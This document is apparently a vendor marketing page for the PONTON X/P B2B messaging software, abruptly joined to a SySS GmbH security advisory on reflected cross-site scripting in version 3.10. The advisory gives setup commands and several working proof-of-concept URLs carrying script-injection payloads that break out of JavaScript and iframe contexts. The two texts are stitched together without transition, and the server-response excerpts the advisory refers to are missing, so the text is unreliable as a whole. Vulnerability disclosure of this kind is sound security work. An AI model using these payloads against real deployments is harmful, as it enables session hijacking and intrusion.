Product Information

## Ponton X/P – Secure Data Communication and B2B Integration

##### Learn about PONTON’s secure data communication workhorse: The PONTON X/P Messenger (or PONTON X/P for short) is PONTON’s high-quality B2B integration solution with a proven track-record in several industries since 2001.

**PONTON X/P** is a highly configurable ebXML, AS1, AS2, AS3 and AS4 compliant messaging software. It provides additional features to deal with typical B2B integration issues (such as a listener component for the DMZ, certificate management and non-repudiation of messages). **PONTON X/P** is typically used as communication layer in a business consortium or as an (OEM) communication extension of an existing software application.

##### PRE-CONFIGURED PONTON X/P VERSIONS FOR YOUR BUSINESS COMMUNITY

PONTON provides custom-built versions of the **PONTON X/P Messenger** that are pre-configured for quick and easy setup with our supported business consortia. Please contact PONTON Support to obtain the latest version suitable for your organisation. Participants of the EDA network can obtain the current version [here](https://confluence.ponton.de/display/OESD).

##### LEVERAGE PONTON X/P TO SET UP COMMUNICATION AMONG 3 TO 300 PARTICIPANTS

The **PONTON X/P** focus is on **1:1 communication** between business partners. It is used as a bridgehead to connect a participant’s local IT infrastructure to the networks of its partners, typically in decentralized settings or as a standardized communication end point of a central service. *P**ONTON* *X/P* leverages existing communication standards to ensure a secure, guaranteed, and non-reputable (ebMS 2.0, AS4) transfer of messages.

PONTON has been **supporting consortia** from different industries in standardisation and implementation of data exchange infrastrctures for over two decades. **PONTON X/P** is used in sectors like energy (Equias, EDA, SMSS), paper / publishing / logistics (papiNet), and health care (German electronic health card). Check the [references](https://www.ponton.de/ponton-x-p-reference) for details.

PONTON helps consortia to find common ground for their co-operation and to **speak the same language** within business processes. It is a common business model to procure a consortium-wide license from PONTON and share the cost within the consortium. This approach provides maximum interoperability through standardisation, while maintaining low cost of operation.

* **Quick, simple start:** e.g. setup **PONTON X/P** on existing infrastructure as standalone software, the **PONTON CA** handles certificate management for you and your partners
* **Efficiently reach enterprise-grade availability** using virtualization or the *PONTON X/P* cluster solution
* **Seamless integration:** use standardized adapters to integrate with your existing systems / ETRM
* **Scale your business:** Process up to 1 Mio messages per day on commodity hardware
* **Minimize maintenance**: Use the **PONTON Partner Registry** to configure a new partner in one step; all connected *PONTON* *X/P* instances update automatically
* **Stay secure:** Minimize open firewall ports by using the **PONTON** **SIA***;* new partners are registered avoiding the need to adapt local firewall settings of the existing partners

### FEATURE SET

##### FLEXIBLE AND EFFICIENT COMMUNICATION CONFIGURATION

Author of Advisory: Stefan Walter, Thibaud Kehler, Tarek Awadallah (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The manufacturer describes the product as follows (see [1]):
> The PONTON X/P Messenger (or PONTON X/P for short) is PONTON’s
> high-quality B2B integration solution with a proven track-record in
> several industries since 2001. PONTON X/P is a highly configurable
> ebXML, AS/1, AS/2, AS/3 and AS/4 compliant messaging software. It
> provides additional features to deal with typical B2B integration
> issues (such as a listener component for the DMZ, certificate
> management and non-repudiation of messages). PONTON X/P is typically
> used as communication layer in a business consortium or as an (OEM)
> communication extension of an existing software application.
The tested version was not the most recent one. The current versions 4.X were
not affected. The vulnerability can only be exploited by authorisation with a
user of the Ponton X/P web UI which is normally only accessible on the internal
network. The vulnerability is fixed with Ponton X/P Version 3.11.2. Please
upgrade to the Version 3.11.2.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
Several functions are vulnerable to reflected cross-site scripting.
For testing purposes, a local installation was set up using the
application binaries provided at [2] and the instructions at [3]:
$ wget 'https://www.ponton.de/downloads/xp/3.10/PontonXP-Messenger-3.10.0-Linux.zip'
$ unzip PontonXP-Messenger-3.10.0-Linux.zip -d PontonXP-Messenger-3.10.0-Linux
$ cd PontonXP-Messenger-3.10.0-Linux
$ ./pontonxp start
Afterwards, the web application is reachable at https://localhost:8443.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH identified three different categories of reflected cross-site scripting:
The first category can be triggered by visiting, for example,
https://localhost:8443/pontonxp/private/index.jsp?partners/ShowNonLocalPartners.do?localID=%27-prompt(%22SySS%20RXSS%20PoC%22)//.
As can be seen in the following excerpt of the server response, the
payload is injected directly into a JavaScript context:

The second category can be triggered by visiting
https://localhost:8443/pontonxp/private/index.jsp?javascript:alert(%27SySS\_RXSS\_PoC%27).
As can be seen in the following excerpt of the server response, the
payload is injected into the iframe src and then executed:

The third category can be triggered by visiting either one of the following
URLs (the list is non-exhaustive):
\* https://localhost:8443/pontonxp/private/index.jsp?database/databaseTab.jsp?syss%22%3E%3C/iframe%3E%3Cscript%3Ealert(%22SySS%20RXSS%20PoC%22);%3C/script%3E
\* https://localhost:8443/pontonxp/private/index.jsp?activation/activationMainTab.jsp?syss%22%3E%3C/iframe%3E%3Cscript%3Ealert(%22SySS%20RXSS%20PoC%22);%3C/script%3E
\* https://localhost:8443/pontonxp/private/index.jsp?communication/serverTab.jsp?syss%22%3E%3C/iframe%3E%3Cscript%3Ealert(%22SySS%20RXSS%20PoC%22);%3C/script%3E
\* https://localhost:8443/pontonxp/private/index.jsp?emailNotification/notificationTab.jsp?ucbgm%22%3E%3C/iframe%3E%3Cscript%3Ealert(%22SySS%20RXSS%20PoC%22);%3C/script%3E
As can be seen in the following excerpt of the server response for the
first request in the list, the payload is used to break out of the
iframe src and to execute code by inserting a new script tag:|  |
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
The vulnerability has been fixed with Ponton X/P version 3.11.2.
